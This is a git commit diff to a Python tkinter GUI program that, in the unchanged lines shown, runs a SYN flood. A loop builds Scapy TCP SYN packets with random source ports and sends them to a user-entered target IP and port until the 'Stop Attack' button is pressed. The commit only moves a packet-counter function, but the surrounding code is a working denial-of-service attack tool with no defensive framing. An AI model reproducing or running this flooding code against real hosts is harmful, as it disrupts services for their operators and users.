9b77ad4d6e3b98ce8e36d83e7c5a3009905d2d04
街角的猫_wjz <134775838+JieJiaoDeMao-wjz@users.noreply.github.com>
2023-08-04 16:49:08 +0800

    Changed the enumerating function

--- Version-6-3-1.py
+++ Version-6-3-1.py
@@ -9,15 +9,18 @@ from tkinter import simpledialog
 
 packet_count = 0
 
+def enumerate_packets():
+    global packet_count
+    output_text.insert(tk.END, f"Packets Sent: {packet_count}\n")
+    output_text.see(tk.END)
+    
 def attack(target_ip, target_port):
     global packet_count
     while start_button["text"] == "Stop Attack":
         packet = IP(dst=target_ip) / TCP(sport=RandShort(), dport=int(target_port), flags="S")
         send(packet, verbose=0)
         packet_count += 1
-        if sys.stdout:
-            sys.stdout.write(f"Packet {packet_count} sent!\n")
-            sys.stdout.flush()
+        enumerate_packets()
 
 def toggle_attack():
     if start_button["text"] == "Start Attack":
@@ -51,12 +54,5 @@ num_threads_entry.pack()
 speed_label = tk.Label(root, text="Attacking Speed: --- packets per second")
 speed_label.pack()
 
-def enumerate_packets():
-    global packet_count
-    output_text.insert(tk.END, f"Packets Sent: {packet_count}\n")
-    output_text.see(tk.END)
-
-enumerate_button = tk.Button(root, text="Count the Packets sent", command=enumerate_packets)
-enumerate_button.pack()
 
 root.mainloop()
